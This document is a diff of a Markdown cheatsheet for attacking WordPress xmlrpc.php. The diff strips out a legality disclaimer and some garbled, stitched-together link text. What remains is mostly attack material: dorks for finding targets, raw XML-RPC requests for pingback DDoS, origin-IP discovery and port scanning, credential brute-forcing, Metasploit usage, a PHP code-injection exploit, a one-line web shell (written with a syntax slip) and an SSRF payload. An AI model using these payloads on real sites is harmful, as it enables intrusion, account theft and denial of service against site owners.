@@ -18,38 +18,13 @@ According to the WordPress documentation ([https://codex.wordpress.org/XML-RPC_S
 
 Note that in this tutorial/cheatsheet the domain “example.com” is actually an example and can be replaced with your specific target.
 
-## Dorks for finding potential targets[](https://nitesculucian.github.io/2019/07/02/exploiting-the-xmlrpc-php-on-all-wordpress-versions/#dorks-for-finding-potential-targets)
+# Dorks for finding potential targets
 
-I would like to add that **any illegal action is your own**, and I can not be held responsible for your actions against a vulnerable target. Test only where you are allowed to do so. Go for the public, known bug bounties and earn your respect within the community.
-
-That’s being said, during bug bounties or penetration testing assessments I had to identify all vulnerable WordPress targets on all subdomains following the rule `*.example.com`. In this specific case I relied on Google dorks in order to fast discovery all potential targets:
-
-- `inurl:"/xmlrpc.php?rsd"` + scoping restrictions
-- `intitle:"WordPress" inurl:"readme.html"` + scoping restrictions = general wordpress detection
-- `allinurl:"wp-content/plugins/"` + scoping restrictions = general wordpress detection
-
-## Searching for XML-RPC servers on WordPress:[](https://nitesculucian.github.io/2019/07/02/exploiting-the-xmlrpc-php-on-all-wordpress-versions/#searching-for-xml-rpc-servers-on-wordpress)
-
-Steps to check:
-
-1. Ensure you are targeting a WordPress site.
-2. Ensure you have access to the `xmlrpc.php` file. In general, it is found at https://example.com/xmlrpc.php and would reply to a GET request with: `XML-RPC server accepts POST requests only.`
-3. It will be pointless to target an XML-RPC server which is disabled/hardcoded/tampered/not working. Therefore, we will check its functionality by sending the following request:
-
-Post Request:
-
-```
-
-```](<# xmlrpc-attack
-Exploiting the xmlrpc.php 
-%3Cbr%3E<br>
-
-## Dorks for finding potential targets
 - inurl:"/xmlrpc.php?rsd"
 - intitle:"WordPress" inurl:"readme.html"
 - allinurl:"wp-content/plugins/"
 
-## Searching for XML-RPC servers on WordPress :
+# Searching for XML-RPC servers on WordPress :
 - Post Method :
   
   ```xml
@@ -100,11 +75,12 @@ Exploiting the xmlrpc.php
     </methodResponse>
 
   ```
-<br><br>
-## XML-RPC pingbacks attacks
-1. Distributed denial-of-service (DDoS) attacks<br>
-2. Cloudflare Protection Bypass (find real server ip)<br>
-3. XSPA (Cross Site Port Attack)<br>
+
+# XML-RPC pingbacks attacks
+
+1. Distributed denial-of-service (DDoS) attacks
+2. Cloudflare Protection Bypass (find real server ip)
+3. XSPA (Cross Site Port Attack)
 
 ```xml
 POST /xmlrpc.php HTTP/1.1
@@ -155,8 +131,9 @@ Content-Type: text/xml; charset=UTF-8
   </fault>
 </methodResponse>
 ```
-<br><br>
-## Brute force attacks
+
+# Brute force attacks
+
 ```xml
 POST /xmlrpc.php HTTP/1.1
 Host: example.com
@@ -216,10 +193,11 @@ Content-Type: text/xml; charset=UTF-8
   </params>
 </methodResponse>
 ```
-<br><br>
-## PHP XML-RPC Arbitrary Code Execution
+
+# PHP XML-RPC Arbitrary Code Execution
+
 This exploits an arbitrary code execution flaw discovered in many implementations of the PHP XML-RPC module. This flaw is exploitable through a number of PHP web applications, including but not limited to Drupal, Wordpress, Postnuke, and TikiWiki.
-<br><br>
+
 To display the available options, load the module within the Metasploit console and run the commands 'show options' or 'show advanced' :
 
 ```
@@ -231,12 +209,10 @@ msf exploit(php_xmlrpc_eval) > show options
     ...show and set options...
 msf exploit(php_xmlrpc_eval) > exploit
 ```
-<br><br>
-## XML-RPC remote code-injection
+# XML-RPC remote code-injection
+
 XML-RPC for PHP is affected by a remote code-injection vulnerability. Pear XML_RPC version 1.3.0 and earlier and PHP XMLRPC version 1.1 and earlier, are vulnerable to PHP remote code injection. The XML parser will pass the data in XML elements to PHP eval() without sanitizing the user input. Lack of parameter filtering allows a remote attacker to execute arbitrary code in the context of the web server.
 
-
-  
  Exploit : 
 > The attacker sends the below XML data in the HTTP POST to the vulnerable server. The XML element <name> contains the PHP command injection. XML-RPC will pass the XML elements to PHP eval() without validating the user input. Upon execution, PHP command drops a malicious script to the tmp directory & modifies the file permission to allow execution.
 
@@ -261,10 +237,9 @@ evil.php :
 <?php system($_GET['cmd'];)?>
 ```
   
-<br>
 The uploaded malicious php can be a backdoor. It allows the  attacker to execute malicious shell commands by sending a GET request to http://target.com/evil.php?cmd=ls
 
-## XMLRPC SSRF
+# XMLRPC SSRF
 ```xml
 <methodCall>
  <methodName>pingback.ping</methodName>
@@ -275,4 +250,5 @@ The uploaded malicious php can be a backdoor. It allows the  attacker to execute
 </param></params>
 </methodCall>
 ```
+
 
